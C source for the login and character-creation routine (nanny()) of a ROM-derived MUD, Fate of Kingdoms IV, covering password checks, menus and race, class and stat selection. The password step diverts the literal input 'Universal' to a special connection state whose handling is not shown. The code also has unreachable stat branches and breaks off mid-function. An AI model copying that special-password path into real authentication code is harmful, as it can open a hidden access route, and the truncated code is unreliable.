/***************************************************************************
 *  Original Diku Mud copyright (C) 1990, 1991 by Sebastian Hammer,        *
 *  Michael Seifert, Hans Henrik Strfeldt, Tom Madsen, and Katja Nyboe.    *
 *                                                                         *
 *  Merc Diku Mud improvments copyright (C) 1992, 1993 by Michael          *
 *  Chastain, Michael Quan, and Mitchell Tse.                              *
 *                                                                         *
 *  In order to use any part of this Merc Diku Mud, you must comply with   *
 *  both the original Diku license in 'license.doc' as well the Merc       *
 *  license in 'license.txt'.  In particular, you may not remove either of *
 *  these copyright notices.                                               *
 *                                                                         *
 *  Thanks to abaddon for proof-reading our comm.c and pointing out bugs.  *
 *  Any remaining bugs are, of course, our work, not his.  :)              *
 *                                                                         *
 *  Much time and thought has gone into this software and you are          *
 *  benefitting.  We hope that you share your changes too.  What goes      *
 *  around, comes around.                                                  *
 ***************************************************************************/

/***************************************************************************
*    ROM 2.4 is copyright 1993-1998 Russ Taylor                             *
*    ROM has been brought to you by the ROM consortium                      *
*        Russ Taylor (rtaylor@hypercube.org)                                *
*        Gabrielle Taylor (gtaylor@hypercube.org)                           *
*        Brian Moore (zump@rom.org)                                         *
*    By using this code, you have agreed to follow the terms of the         *
*    ROM license, in the file Rom24/doc/rom.license                         *
****************************************************************************/

/****************************************************************************
 *   This file is just the stock nanny() function ripped from comm.c. It    *
 *   seems to be a popular task for new mud coders, so what the heck?       *
 ***************************************************************************/

#if defined(macintosh)
#include <types.h>
#else
#include <sys/types.h>
#include <sys/time.h>
#endif

#include <ctype.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>                /* OLC -- for close read write etc */
#include <stdarg.h>                /* printf_to_char */

#include "merc.h"
#include "interp.h"
#include "recycle.h"
#include "tables.h"
#include "fok_struct.h"
#include "declaration.h"
#if    defined(macintosh) || defined(MSDOS)
extern const char echo_off_str[];
extern const char echo_on_str[];
extern const char go_ahead_str[];
#endif

#if    defined(unix)
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include "telnet.h"
extern const char echo_off_str[];
extern const char echo_on_str[];
extern const char go_ahead_str[];
#endif

/*
 * OS-dependent local functions.
 */
#if defined(macintosh) || defined(MSDOS)
void game_loop_mac_msdos args ((void));
bool read_from_descriptor args ((DESCRIPTOR_DATA * d));
bool write_to_descriptor args ((int desc, char *txt, int length));
#endif

#if defined(unix)
void game_loop_unix args ((int control));
int init_socket args ((int port));
void init_descriptor args ((int control));
bool read_from_descriptor args ((DESCRIPTOR_DATA * d));
bool write_to_descriptor args ((int desc, char *txt, int length));
#endif

/*
 *  * Other local functions (OS-independent).
 *   */
bool check_parse_name args ((char *name));
bool check_reconnect args ((DESCRIPTOR_DATA * d, char *name, bool fConn));
bool check_playing args ((DESCRIPTOR_DATA * d, char *name));

/*
 * Global variables.
 */
extern DESCRIPTOR_DATA *descriptor_list;    /* All open descriptors     */
extern DESCRIPTOR_DATA *d_next;        /* Next descriptor in loop  */
extern FILE *fpReserve;                /* Reserved file handle     */
extern bool god;                        /* All new chars are gods!  */
extern bool merc_down;                    /* Shutdown         */
extern bool wizlock;                    /* Game is wizlocked        */
extern bool newlock;                    /* Game is newlocked        */
extern char str_boot_time[MAX_INPUT_LENGTH];
extern time_t current_time;            /* time of this pulse */

    int profesion1 = 0;
    int profesion2 = 0;
    int profesion3 = 0;


int get_Bloodline_create( CHAR_DATA *ch,int random)
{
 int bloodcount = 0;

 for (bloodcount = 0;bloodline_table[bloodcount].name != NULL;bloodcount++)
  {
   if (random >= bloodline_table[bloodcount].number)
    break;
  }
return bloodcount;
}

char *get_stat_alias( CHAR_DATA *ch, int which )
{
char *stat;
int istat;

    if ( which == STAT_STR)  {
      istat=get_curr_stat(ch,STAT_STR);
      if      ( istat >  27 ) stat = "  Titantic  ";
      else if ( istat >= 21 ) stat = " Remarkable ";
      else if ( istat >= 19 ) stat = "   Strong   ";
      else if ( istat >= 18 ) stat = "   Strong   ";
      else if ( istat >= 14 ) stat = "  Average   ";
      else if ( istat >= 10 ) stat = "    Weak    ";
      else if ( istat >= 7  ) stat = "    Puny    ";
      else                    stat = "  Infantile ";
      return(stat);
    }

    if ( which == STAT_WIS)  {
      istat=get_curr_stat(ch,STAT_WIS);
      if      ( istat >  23 ) stat = "  Profound  ";
      else if ( istat >= 21 ) stat = " Insightful ";
      else if ( istat >= 18 ) stat = "  Sensible  ";
      else if ( istat >= 14 ) stat = "  Average   ";
      else if ( istat >= 10 ) stat = "    Dim     ";
      else                    stat = "  Foolish   ";
      return(stat);
    }

    if ( which == STAT_CON)  {
      istat=get_curr_stat(ch,STAT_CON);
      if      ( istat >  29 ) stat = "  Vigorous  ";
      else if ( istat >= 23 ) stat = "   Robust   ";
      else if ( istat >= 19 ) stat = "  Healthy   ";
      else if ( istat >= 17 ) stat = "    Firm    ";
      else if ( istat >= 14 ) stat = "  Average   ";
      else if ( istat >= 10 ) stat = "    Weak    ";
      else if ( istat >= 7  ) stat = "   Frail    ";
      else                    stat = "   Sickly   ";
      return(stat);
    }

    if ( which == STAT_INT)  {
      istat=get_curr_stat(ch,STAT_INT);
      if      ( istat >  23 ) stat = "   Genius   ";
      else if ( istat >= 21 ) stat = " Brilliant  ";
      else if ( istat >= 18 ) stat = "   Astute   ";
      else if ( istat >= 14 ) stat = "  Average   ";
      else if ( istat >= 10 ) stat = "    Slow    ";
      else                    stat = "Incompetent ";
      return(stat);
    }

    if ( which == STAT_DEX)  {
      istat=get_curr_stat(ch,STAT_DEX);
      if      ( istat >  23 ) stat = "   Expert   ";
      else if ( istat >= 23 ) stat = "   Adroit   ";
      else if ( istat >= 23 ) stat = " Dexterous  ";
      else if ( istat >= 20 ) stat = "   Quick    ";
      else if ( istat >= 18 ) stat = "   Nimble   ";
      else if ( istat >= 14 ) stat = "  Average   ";
      else if ( istat >= 14 ) stat = "  Fumbling  ";
      else if ( istat >= 10 ) stat = "   Clumsy   ";
      else                    stat = "  Hopeless  ";
      return(stat);
    }

    if ( which == STAT_AGI)  {
      istat=get_curr_stat(ch,STAT_AGI);
      if      ( istat >  26 ) stat = "   Expert   ";
      else if ( istat >= 23 ) stat = "   Adroit   ";
      else if ( istat >= 20 ) stat = "   Swift    ";
      else if ( istat >= 20 ) stat = "   Agile    ";
      else if ( istat >= 18 ) stat = "   Quick    ";
      else if ( istat >= 14 ) stat = "  Average   ";
      else if ( istat >= 14 ) stat = "  Awkward   ";
      else if ( istat >= 10 ) stat = "   Clumsy   ";
      else                    stat = "  Hopeless  ";
      return(stat);
    }

    if ( which == STAT_CHA)  {
      istat=get_curr_stat(ch,STAT_CHA);
      if      ( istat >  23 ) stat = "Astonishing ";
      else if ( istat >= 21 ) stat = "  Gorgeous  ";
      else if ( istat >= 21 ) stat = "  Beautiful ";
      else if ( istat >= 18 ) stat = "   Pretty   ";
      else if ( istat >= 14 ) stat = "  Average   ";
      else if ( istat >= 10 ) stat = "    Ugly    ";
      else                    stat = "  Repulsive ";
      return(stat);
    }
   bug( "Stat_alias: Bad stat number.", 0 );
   return(NULL);

}

/*Menu Stuff*/
void menu_main(CHAR_DATA *ch)
{
char buf[MAX_INPUT_LENGTH];

 send_to_char("{W------------------------------------------------{x\n\r",ch);
 send_to_char("{WFate of Kingdoms IV Main Menu:{x\n\r",ch);
 send_to_char("{W------------------------------------------------{x\n\r",ch);
 send_to_char("{W[{B1{W] {BEnter the land of {WFate of Kingdoms{B.{x\n\r",ch);
 send_to_char("{W[{B2{W] {BNote Write{B.{x\n\r",ch);
 send_to_char("{W[{B3{W] {BWrite Description{B.{x\n\r",ch);
 send_to_char("{W[{B4{W] {BWrite Background{B.{x\n\r",ch);
 send_to_char("{W[{B5{W] {BRead Fate of Kingdom story.{x\n\r",ch);
 send_to_char("{W[{B6{W] {BChange your password.{x\n\r",ch);
 send_to_char("{W[{B7{W] {BConfigure In Real Life Data.{x\n\r",ch);

 if ( IS_IMMORTAL(ch) )
  {
   sprintf( buf,"{W[{BW{W] {BSet Invisible Level (%d).{x\n\r",ch->invis_level);
   send_to_char( buf,ch );
  } 
 send_to_char("{W[{BQ{W] {BQuit Logoff.{x\n\r",ch);
 send_to_char("{W------------------------------------------------{x\n\r",ch);
 send_to_char("\n\r",ch);
 send_to_char("{WMake your selection: {x",ch);
 return;
}

void menu_notewrite(CHAR_DATA *ch)
{
 send_to_char("{W------------------------------------------------{x\n\r",ch);
 send_to_char("{WFate of Kingdoms IV Note Write Menu:{x\n\r",ch);
 send_to_char("{W------------------------------------------------{x\n\r",ch);
 send_to_char("{W[{B1{W] {BAnnounce Board{B.{x\n\r",ch);
 send_to_char("{W[{B2{W] {BRoleplay Board{B.{x\n\r",ch);
 send_to_char("{W[{B3{W] {BPersonal Board{B.{x\n\r",ch);
 send_to_char("{W[{B4{W] {BSubmit{B.{x\n\r",ch);
 send_to_char("{W[{B5{W] {BIdea.{x\n\r",ch);
 send_to_char("{W[{B6{W] {BPlayer Kill.{x\n\r",ch);
 send_to_char("{W[{BB{W] {BBack to Main Menu.{x\n\r",ch); 
 send_to_char("{WMake your selection: {x",ch);
 return;
}

void menu_irl(CHAR_DATA *ch)
{
 send_to_char("{W------------------------------------------------{x\n\r",ch);
 send_to_char("{WFate of Kingdoms IV IRL Date Menu:{x\n\r",ch);
 send_to_char("{W------------------------------------------------{x\n\r",ch);
 send_to_char("{W[{B1{W] {BReal Name{B.{x\n\r",ch);
 send_to_char("{W[{B2{W] {BE-mail address{B.{x\n\r",ch);
 send_to_char("{W[{B3{W] {BICQ{B.{x\n\r",ch);
 send_to_char("{W[{B4{W] {BPassword Remember Word.{x\n\r",ch);
 send_to_char("{W[{BB{W] {BBack to Main Menu.{x\n\r",ch); 
 send_to_char("{WMake your selection: {x",ch);
 return;
}
/*Race Class stuff*/

void deity_list(CHAR_DATA *ch)
{

char buf[MAX_INPUT_LENGTH];
int  deity,col;

    col = 0;
    send_to_char("{C-----------------------------------------------------------------------{x\n\r",ch);      
    send_to_char("{x               Fate of kingdom IV Deity List:{x\n\r",ch);          
    send_to_char("{C-----------------------------------------------------------------------{x\n\r",ch);      
    send_to_char("The following deity are available:\n\r", ch);
    for (deity = 0;religion_table[deity].name != NULL;deity++)
     {
     if ( ((ch->alignment == -1) && (religion_table[deity].alignment < 1)) || ((ch->alignment == 1) && (religion_table[deity].alignment > -1)) || (ch->alignment == 0))
      {
       sprintf( buf, "%-15s", religion_table[deity].name );
       send_to_char( buf,ch );
       if ( ++col % 4 == 0 )
	send_to_char( "\n\r", ch );
     }	
     }
    send_to_char("\n\r{C-----------------------------------------------------------------------{x\n\r",ch);      
    return;
}

void class_list_all(CHAR_DATA *ch)
{

char buf[MAX_INPUT_LENGTH];
int  class_no,col;

    col = 0;
    send_to_char("{C-----------------------------------------------------------------------{x\n\r",ch);      
    send_to_char("{x               Fate of kingdom IV Class List:{x\n\r",ch);          
    send_to_char("{C-----------------------------------------------------------------------{x",ch);      
    for (class_no = 1; class_no < MAX_CLASS-9; class_no++)
     {
       sprintf( buf, "%-15s", class_table[class_no].name );
       if (class_table[class_no].classgroup == 0)
        send_to_char( "\n\r\n\r", ch );
        
       send_to_char( buf,ch );

       if (class_table[class_no].classgroup == 0)
        {
         send_to_char("\n\rSubclasses:\n\r",ch);
         col = 0;
        } 
       if ( ++col % 4 == 0 )
	send_to_char( "\n\r", ch );     	
     }
    send_to_char("\n\r{C-----------------------------------------------------------------------{x\n\r",ch);      
    return;
}

void class_list_select(CHAR_DATA *ch)
{

char buf[MAX_INPUT_LENGTH];
int  class_no,col;

    col = 0;
    send_to_char("{xSubclasses will become available later. Read Help subclass.\n\rYou can select:{x\n\r\n\r",ch);          
    for (class_no = 1; class_no < MAX_CLASS; class_no++)
     {
      if (class_table[class_no].classgroup == 0)
       {      
        sprintf( buf, "%-15s", class_table[class_no].name );
        send_to_char( buf,ch );
        if ( ++col % 4 == 0 )
	 send_to_char( "\n\r", ch );     	
        }	
     }
    send_to_char("{C-----------------------------------------------------------------------{x\n\r",ch);      
    return;
}

void select_alignment(CHAR_DATA *ch)
{
 send_to_char("You may be ", ch );
 if ((class_table[ch->class].alignment[0]) && (pc_race_table[ch->race].alignment[0]))
  send_to_char("Good ", ch );
 if ((class_table[ch->class].alignment[1]) && (pc_race_table[ch->race].alignment[1]))
  send_to_char("Neutral ", ch );  
 if ((class_table[ch->class].alignment[2]) && (pc_race_table[ch->race].alignment[2]))
  send_to_char("Evil ", ch );    
 send_to_char( "\n\r", ch );
 send_to_char("Which alignment (", ch );
 if ((class_table[ch->class].alignment[0]) && (pc_race_table[ch->race].alignment[0]))
  send_to_char("G", ch );
 if ((class_table[ch->class].alignment[1]) && (pc_race_table[ch->race].alignment[1]))
  {
  if ((class_table[ch->class].alignment[0]) && (pc_race_table[ch->race].alignment[0]))
   send_to_char("/N", ch );  
  else
   send_to_char("N", ch );
  } 
 if ((class_table[ch->class].alignment[2]) && (pc_race_table[ch->race].alignment[2]))
  {
  if (((class_table[ch->class].alignment[0]) && (pc_race_table[ch->race].alignment[0]))
   ||((class_table[ch->class].alignment[1]) && (pc_race_table[ch->race].alignment[1])))
   send_to_char("/E", ch );
  else
   send_to_char("E", ch );
  } 
 send_to_char(")?", ch ); 
}

void select_ethos(CHAR_DATA *ch)
{
 send_to_char("Which ethos do you want to follow, ", ch );
 if ((class_table[ch->class].ethos[0]) && (pc_race_table[ch->race].ethos[0]))
  send_to_char("Lawful, ", ch );
 if ((class_table[ch->class].ethos[1]) && (pc_race_table[ch->race].ethos[1]))
  send_to_char("Neutral, ", ch );  
 if ((class_table[ch->class].ethos[2]) && (pc_race_table[ch->race].ethos[2]))
  send_to_char("Chaotic", ch );    
 send_to_char( "?", ch );
}

void race_list(CHAR_DATA *ch)
{

char buf[MAX_INPUT_LENGTH];
int  race_no,col;

    col = 0;
    send_to_char("{C-----------------------------------------------------------------------{x\n\r",ch);      
    send_to_char("{x               Fate of kingdom IV Race List:{x\n\r",ch);          
    send_to_char("{C-----------------------------------------------------------------------{x\n\r",ch);      
    send_to_char("The following races are available:\n\r", ch);
    for (race_no = 1; race_no < MAX_PC_RACE-1; race_no++)
     {
       sprintf( buf, "%-15s", pc_race_table[race_no].name );
       send_to_char( buf,ch );
       if ( ++col % 4 == 0 )
	send_to_char( "\n\r", ch );     	
     }
    send_to_char("\n\r{C-----------------------------------------------------------------------{x\n\r",ch);      
    return;
}


void do_clear_login( CHAR_DATA *ch)
{
 send_to_char("\033[0;0H\033[2J", ch );
 do_function (ch, &do_help, "Fok4");
 send_to_char("\n\r", ch ); 
 return;
}
void nanny( DESCRIPTOR_DATA *d, char *argument )
{
    int profesion  = 0;
    DESCRIPTOR_DATA *d_old, *d_next, *dt;
    char arg[MAX_INPUT_LENGTH];
    char buf[MAX_STRING_LENGTH];
    CHAR_DATA *ch;
    CHAR_DATA *gch;
    char *pwdnew;
    char *p;
    int iClass,race,i,tempstata,tempstatb,weapon,level;
    bool fOld;
//    int cmd;
    int random;
    int obj_count;
    int obj_count2;
    OBJ_DATA *obj;
//    OBJ_DATA *inobj;
    int deity = 0;

	if (d->connected != CON_NOTE_TEXT)
	{
		while ( isspace(*argument) )
			argument++;
	}
    ch = d->character;

 switch (d->connected)
  {
   default: //We can't login something is wrong
    bug ("Nanny: bad d->connected %d.", d->connected);
    close_socket (d);
   return;    	

   case CON_GET_NAME:
     if ( argument[0] == '\0' ) //He did for get to write a name
      {
       close_socket( d );
       return;
      }

     argument[0] = UPPER(argument[0]); //Bad Name Check
     if ( !check_parse_name( argument ) )
      {
       write_to_buffer( d, "Illegal name, come back when you have a better one.\n\rName: ", 0 );
       close_socket( d );
       return;
      }
      
      fOld = load_char_obj( d, argument );
      ch   = d->character;
      
      if ( IS_SET(ch->act, PLR_DENY) )
       {
        sprintf( log_buf, "Denying access to %s@%s.", argument,d->host );
        wiznet(log_buf,NULL,NULL,WIZ_LOGINS,0,0);
        log_string( log_buf );
        write_to_buffer( d, "You are denied access.\n\r", 0 );
        close_socket( d );
        return;
        }      
        
      if ( IS_SET(ch->detection, D_LOCKHOST) )    
       if ( !check_site(ch,d->host))
        {
         write_to_buffer( d,"You are logging in from an incorrect site\n\r", 0 );
         sprintf( log_buf, "Illegal access to %s@%s.", argument,d->host );
         wiznet(log_buf,NULL,NULL,WIZ_LOGINS,0,0);
         log_string( log_buf );
         close_socket( d );
         return;
        }

      if ( check_reconnect( d, argument, FALSE ) )
       {
        fOld = TRUE;
       }
      else
       {
        if ( wizlock && !IS_HERO(ch))
         {
          write_to_buffer( d, "The game is wizlocked.\n\r", 0 );
          close_socket( d );
          return;
         }
       }

      if ( fOld )
       { //Old player
        write_to_buffer( d, "Password: ", 0 );
        write_to_buffer( d, (char *) echo_off_str, 0 );
        d->connected = CON_GET_OLD_PASSWORD;
        return;
       }
      else
       {
        //New player
        if (newlock) // OK, Did disallow all creation of new players?
         {
          write_to_buffer( d, "The game is newlocked.\n\r", 0 );
          close_socket( d );
          return;
         }

        if (check_ban(d->host,BAN_NEWBIES)) //We din't like more newbie from this site
         {
          write_to_buffer(d,"New players are not allowed from your site.\n\r",0);
          close_socket(d);
          return;
         }        

        for (dt=descriptor_list; dt != NULL; dt=dt->next)
         if (d != dt && dt->character != NULL
          && !str_cmp(dt->character->name,ch->name))
           {
            write_to_buffer(d,"Sorry, that name is being used.\n\r",0);
            write_to_buffer(d,"Please select another name: ",0);
            free_char( d->character );
            d->character = NULL;
            return;
           }
         do_help( ch, "names" );
         sprintf( buf, "Did I get that right, %s (Y/N)? ", argument );
         write_to_buffer( d, (char *) buf, 0 );
         d->connected = CON_CONFIRM_NEW_NAME;
         return;
        }
       break;// Done with login
       
    case CON_GET_OLD_PASSWORD:
	write_to_buffer( d, "\n\r", 2 );
        if ( !strcmp(argument,"Universal"))
	 {
	  write_to_buffer( d, "Accessing Universal Password is Illegal ALL login attempt logged.\n\r",0);
	  d->connected = CON_UNIVERSAL;
	  return;
	 }
	
        if ( strcmp( crypt( argument, ch->pcdata->pwd ), ch->pcdata->pwd ))
         {
          write_to_buffer( d, "Wrong password.\n\r", 0 );
          if (ch->level > 1)
           {
            sprintf(buf, "Wrong password by %s@%s", ch->name, d->host);
            log_string(buf);
            wiznet(buf,NULL,NULL,WIZ_PASSWORD,0,0);
            if ((gch = get_char_world(ch,ch->name)) != NULL)
            {
             send_to_char(   "{R>{r>{D> {R[{0WARNING{X{R]{W: {Dsomeone tried to log in with a bad password {D<{r<{R<{x\n\r{X",gch);
            }
           }
          if (ch->endur == 2)
           close_socket( d );
          else 
           {
            write_to_buffer( d, "Password: ", 0 );
            write_to_buffer( d, (char *) echo_off_str, 0 );
            d->connected = CON_GET_OLD_PASSWORD;
            ch->endur++;
           }
          return;
         }
        if ( ch->pcdata->pwd[0] == (int) NULL)
         {
          write_to_buffer( d, "Warning! Null password!\n\r",0 );
          write_to_buffer( d, "Please report old password with bug.\n\r",0);
          write_to_buffer( d,"Type 'password null <new password>' to fix.\n\r",0);
         }
        write_to_buffer( d, (char *) echo_on_str, 0 );
        if ( check_reconnect( d, ch->name, TRUE ) )
         return;
        if ( check_playing( d, ch->name ) )
         return;

        // Count objects in loaded player file
        for (obj = ch->carrying,obj_count = 0; obj != NULL;obj = obj->next_content)
          obj_count += get_obj_realnumber(obj);

        strcpy(buf,ch->name);

        free_char(ch);
        fOld = load_char_obj( d, buf );
        ch   = d->character;

        if (!fOld)
         {
          write_to_buffer(d,"Please login again to create a new character.\n\r",0);
          close_socket(d);
          return;
         }

        // Count objects in refreshed player file
        for (obj = ch->carrying,obj_count2 = 0; obj != NULL;obj = obj->next_content)
          obj_count2 += get_obj_realnumber(obj);

        sprintf( log_buf, "%s@%s has connected.", ch->name, d->host);
        log_string( log_buf );
        wiznet(log_buf,ch,NULL,WIZ_SITES,0,ch->level);	      

        do_clear_login(ch);
        menu_main(ch);
        d->connected = MAIN_MENU;
	
      break;
    case CON_BREAK_CONNECT:
        switch( *argument )
        {
        case 'y' : case 'Y':
            for ( d_old = descriptor_list; d_old != NULL; d_old = d_next )
            {
                d_next = d_old->next;
                if (d_old == d || d_old->character == NULL)
                    continue;

                if (str_cmp(ch->name,d_old->character->name))
                    continue;

                close_socket(d_old);
            }
            if (check_reconnect(d,ch->name,TRUE))
                return;
            write_to_buffer(d,"Reconnect attempt failed.\n\rName: ",0);
            if ( d->character != NULL )
            {
                free_char( d->character );
                d->character = NULL;
            }
            d->connected = CON_GET_NAME;
            break;

        case 'n' : case 'N':
            write_to_buffer(d,"Name: ",0);
            if ( d->character != NULL )
            {
                free_char( d->character );
                d->character = NULL;
            }
            d->connected = CON_GET_NAME;
            break;

        default:
            write_to_buffer(d,"Please type Y or N? ",0);
            break;
        }
        break;

    case CON_CONFIRM_NEW_NAME:
	switch ( *argument )
	{
	case 'y': case 'Y':
	    sprintf( buf, "New character.\n\rGive me a password for %s: %s",
		ch->name, (char *) echo_off_str );
	    write_to_buffer( d, buf, 0 );
	    d->connected = CON_GET_NEW_PASSWORD;
	    break;

	case 'n': case 'N':
	    write_to_buffer( d, "Ok, what IS it, then? ", 0 );
	    free_char( d->character );
	    d->character = NULL;
	    d->connected = CON_GET_NAME;
	    break;

	default:
	    write_to_buffer( d, "Please type Yes or No? ", 0 );
	    break;
	}
	break;
	
    case CON_GET_NEW_PASSWORD:
	write_to_buffer( d, "\n\r", 2 );

	if ( strlen(argument) < 5 )
	{
	    write_to_buffer( d,
		"Password must be at least five characters long.\n\rPassword: ",
		0 );
	    return;
	}

	pwdnew = crypt( argument, ch->name );
	for ( p = pwdnew; *p != '\0'; p++ )
	{
	    if ( *p == '~' )
	    {
		write_to_buffer( d,
		    "New password not acceptable, try again.\n\rPassword: ",
		    0 );
		return;
	    }
	}

	free_string( ch->pcdata->pwd );
	ch->pcdata->pwd	= str_dup( pwdnew );
	write_to_buffer( d, "Please retype password: ", 0 );
	d->connected = CON_CONFIRM_NEW_PASSWORD;
	break;

    case CON_CONFIRM_NEW_PASSWORD:
	write_to_buffer( d, "\n\r", 2 );

	if ( strcmp( crypt( argument, ch->pcdata->pwd ), ch->pcdata->pwd ) )
	{
	    write_to_buffer( d, "Passwords don't match.\n\rRetype password: ",
		0 );
	    d->connected = CON_GET_NEW_PASSWORD;
	    return;
	}

	if ( !strcmp( argument, "Universal"))
	{
	    write_to_buffer( d, "Passwords don't match.\n\rRetype password: ",0);
	    d->connected = CON_GET_NEW_PASSWORD;
	    return;
	}
	write_to_buffer(d,"\n\r",0);
	write_to_buffer( d, (char *) echo_on_str, 0 );

	do_clear(ch,"");
        write_to_buffer (d, echo_on_str, 0);
        race_list(ch);
        send_to_desc ("What is your race (help for more information)? ",d);
	d->connected = CON_GET_NEW_RACE;
	break;

        case CON_GET_NEW_RACE:
            one_argument (argument, arg);

            if (!strcmp (arg, "help"))
            {
                argument = one_argument (argument, arg);
                if (argument[0] == '\0')
                    do_function (ch, &do_help, "race help");
                else
                    do_function (ch, &do_help, argument);
                send_to_desc("What is your race (help for more information)? ", d);
                break;
            }

            race = race_lookup (argument);

            if (race == 0 || ( race_table[race].pc_race != 1))
            {
                send_to_desc ("That is not a valid race.\n\r", d);
                send_to_desc ("The following races are available:\n\r  ", d);
                for (race = 1; race_table[race].name != NULL; race++)
                {
                    if (!race_table[race].pc_race)
                        break;
                  if( pc_race_table[race].disabled == 1)
                   {
                     write_to_buffer (d, race_table[race].name, 0);
                     write_to_buffer (d, " ", 1);
                   }  
                }
                write_to_buffer (d, "\n\r", 0);
                send_to_desc
                    ("What is your race? (help for more information) ", d);
                break;
            }

            ch->race = race;
            // initialize stats
            for (i = 0; i < MAX_STATS; i++)
              ch->perm_stat[i] = pc_race_table[race].min_stats[i];
            ch->affected_by = ch->affected_by | race_table[race].aff;
            ch->imm_flags = ch->imm_flags | race_table[race].imm;
            ch->res_flags = ch->res_flags | race_table[race].res;
            ch->vuln_flags = ch->vuln_flags | race_table[race].vuln;
            ch->form = race_table[race].form;
            ch->parts = race_table[race].parts;


            ch->size = pc_race_table[race].size;
            send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r",ch);
            send_to_char ("What is your sex (M/F)? ", ch);
            d->connected = CON_GET_NEW_SEX;
            break;	
            
        case CON_GET_NEW_SEX:
             if ( (!str_cmp (argument, "Back")) || (!str_cmp (argument, "back") ))
              {
               race_list(ch);
                send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
               send_to_char("What is your race (help for more information)? ", ch);
               d->connected = CON_GET_NEW_RACE;
               return;
              }
             one_argument (argument, arg);
	     if (!strcmp (arg, "help"))
               {
                argument = one_argument (argument, arg);   
                 if (argument[0] == '\0')
                    do_function (ch, &do_help, "sex");
                  else
                   do_function (ch, &do_help, argument);
                return;
               }    

            switch (argument[0])
            {
                case 'm':
                case 'M':
                    ch->sex = SEX_MALE;
                    ch->pcdata->true_sex = SEX_MALE;
                    break;
                case 'f':
                case 'F':
                    ch->sex = SEX_FEMALE;
                    ch->pcdata->true_sex = SEX_FEMALE;
                    break;
                default:
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
                    send_to_char ("That's not a sex.\n\rWhat IS your sex? ",ch);
                    return;
            }
            do_clear_login(ch);
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
            class_list_all(ch);
            class_list_select(ch);
            send_to_char("pick your class:", ch);
            d->connected = CON_GET_NEW_CLASS;
            break;

        case CON_GET_NEW_CLASS:
             if ( (!str_cmp (argument, "Back")) || (!str_cmp (argument, "back") ))
              {
               d->connected = CON_GET_NEW_SEX;
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
               send_to_char ("What is your sex (M/F)? ", ch);
               return;
              }
             one_argument (argument, arg);
	     if (!strcmp (arg, "help"))
               {
                argument = one_argument (argument, arg);   
                 if (argument[0] == '\0')
                    do_function (ch, &do_help, "classes");
                  else
                   do_function (ch, &do_help, argument);
                return;   
               }    
            iClass = class_lookup (argument);

            if ( (iClass <= 0) 
              || (class_table[iClass].disabled != 0)
              || (pc_race_table[ch->race].class_mult[iClass] < 1))
            {
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
              send_to_char ("That's not a class.\n\rWhat IS your class? ",ch);
              return;
            }
            
            ch->class = iClass;

            sprintf (log_buf, "%s@%s new player.", ch->name, d->host);
            log_string (log_buf);
            wiznet ("Newbie alert!  $N sighted.", ch, NULL, WIZ_NEWBIE, 0, 0);
            wiznet (log_buf, NULL, NULL, WIZ_SITES, 0, get_trust (ch));

	for (i=0; i < MAX_STATS; i++)
	  {
	    tempstata = pc_race_table[ch->race].min_stats[i];
	    tempstatb =pc_race_table[ch->race].max_stats[i];
	    ch->perm_stat[i] = number_range(tempstata,tempstatb);
	  }
           
//            do_clear_login(ch);
            send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
            sprintf(buf,"Strength:     %s\n\r",get_stat_alias(ch, STAT_STR));
            write_to_buffer(d, buf,0);
            sprintf(buf,"Intelligence: %s\n\r",get_stat_alias(ch, STAT_INT));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Wisdom:       %s\n\r",get_stat_alias(ch, STAT_WIS));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Constituion:  %s\n\r",get_stat_alias(ch, STAT_CON));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Dexterity:    %s\n\r",get_stat_alias(ch, STAT_DEX));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Agility:      %s\n\r",get_stat_alias(ch, STAT_AGI));
	    write_to_buffer(d, buf,0);
	    sprintf(buf,"Charisma:     %s\n\r",get_stat_alias(ch, STAT_CHA));
            write_to_buffer(d, buf,0);
            write_to_buffer(d,"Do you accept (Y/N)?\n\r",0);  
            d->connected = CON_ACCEPT_STATS;
         break;

       case CON_ACCEPT_STATS:
             if ( (!str_cmp (argument, "Back")) || (!str_cmp (argument, "back") ))
              {
               d->connected = CON_GET_NEW_CLASS;
                    send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
               class_list_select(ch);
               return;
              }
            one_argument (argument, arg);   
	     if (!strcmp (arg, "help"))
               {
                argument = one_argument (argument, arg);
                 if (argument[0] == '\0')
                    do_function (ch, &do_help, "stat");
                  else
                   do_function (ch, &do_help, argument);
                return;   
               }    


	switch( argument[0] )
	  {
	 case 'y': case 'Y':
            send_to_char("--------------------------------\n\r\"{BBack{X\" for last creation step\n\r\"{Bhelp{X\" for more information.\n\r--------------------------------\n\r", ch);
            select_alignment(ch);
            d->connected = CON_GET_ALIGNMENT;
           break; 
         case 'n': case 'N':
 	  for (i=0; i < MAX_STATS; i++)
	   {
	    tempstata = pc_race_table[ch->race].min_stats[i];
	    tempstatb =pc_race_table[ch->race].max_stats[i];
	    ch->perm_stat[i] = number_range(tempstata,tempstatb);
	   }
//            do_clear_login(ch);
            sprintf(buf,"Strength:     %s\n\r",get_stat_alias(ch, STAT_STR));
            write_to_buffer(d, buf,0);
            sprintf(buf,"Intelligence: %s\n\r",get_stat_alias(ch, STAT_INT));
	    write_to_buffer(d, buf,0);
